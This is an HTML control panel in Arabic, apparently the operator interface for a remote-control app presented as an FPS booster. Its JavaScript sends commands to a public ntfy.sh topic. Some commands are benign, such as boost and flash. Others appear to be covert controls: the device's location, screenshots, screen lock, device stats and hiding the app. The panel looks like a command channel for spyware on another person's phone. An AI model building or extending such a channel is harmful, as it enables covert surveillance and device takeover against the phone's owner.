<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MSLIM Control Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#e0e0e0;font-family:monospace;display:flex;justify-content:center;padding:15px}
.c{width:min(100%,600px)}
.logo{text-align:center;color:#d4af37;font-size:24px;font-weight:bold;letter-spacing:5px;padding:15px 0;text-shadow:0 0 20px #d4af37}
.line{border:1px solid #d4af37;margin:10px 0}
.btn{display:block;width:100%;padding:14px;margin:5px 0;background:#141414;color:#00ff41;border:2px solid #00ff41;border-radius:8px;font-family:monospace;font-size:14px;cursor:pointer;text-align:center}
.btn:active{background:#1a1a1a}
.btn-red{border-color:#ff4444;color:#ff4444}
.btn-yellow{border-color:#ffcc00;color:#ffcc00}
.btn-blue{border-color:#00aaff;color:#00aaff}
.btn-purple{border-color:#B84CFF;color:#B84CFF}
.stats{color:#999;font-size:11px;text-align:center;padding:8px 0}
</style>
</head>
<body>
<div class="c">
<div class="logo">M S L I M</div>
<div class="stats">🎛️ لوحة التحكم</div>
<div class="line"></div>

<button class="btn" onclick="sendCmd('boost')">⚡ تعزيز FPS</button>
<button class="btn btn-red" onclick="sendCmd('stopboost')">⏹️ إيقاف التعزيز</button>
<button class="btn btn-blue" onclick="sendCmd('overlay')">📊 FPS عائم</button>
<button class="btn btn-yellow" onclick="sendCmd('flash_on')">💡 فلاش ON</button>
<button class="btn btn-yellow" onclick="sendCmd('flash_off')">💡 فلاش OFF</button>
<button class="btn btn-purple" onclick="sendCmd('vibrate')">📳 اهتزاز</button>
<button class="btn btn-red" onclick="sendCmd('lock')">🔒 قفل الشاشة</button>
<button class="btn" onclick="sendCmd('home')">🏠 الرئيسية</button>
<button class="btn btn-blue" onclick="sendCmd('location')">📍 الموقع</button>
<button class="btn btn-red" onclick="sendCmd('screenshot')">📸 سكرين شوت</button>
<button class="btn" onclick="sendCmd('stats')">📊 حالة الجهاز</button>
<button class="btn btn-red" onclick="sendCmd('hide')">👻 إخفاء التطبيق</button>

<div class="line"></div>
<div class="stats" id="status">جاهز</div>
</div>

<script>
// ✅ بدون توكن - الموقع فقط يرسل الأوامر
// الأوامر تذهب إلى ntfy.sh مباشرة
const NTFY_TOPIC = "mslim_control_8812153354";

function sendCmd(command) {
    const status = document.getElementById('status');
    status.innerHTML = '⏳ إرسال: ' + command + '...';
    status.style.color = '#ffcc00';
    
    fetch('https://ntfy.sh/' + NTFY_TOPIC, {
        method: 'POST',
        body: command
    })
    .then(() => {
        status.innerHTML = '✅ تم الإرسال';
        status.style.color = '#00ff41';
    })
    .catch(() => {
        status.innerHTML = '❌ فشل';
        status.style.color = '#ff4444';
    });
}
</script>
</body>
</html>
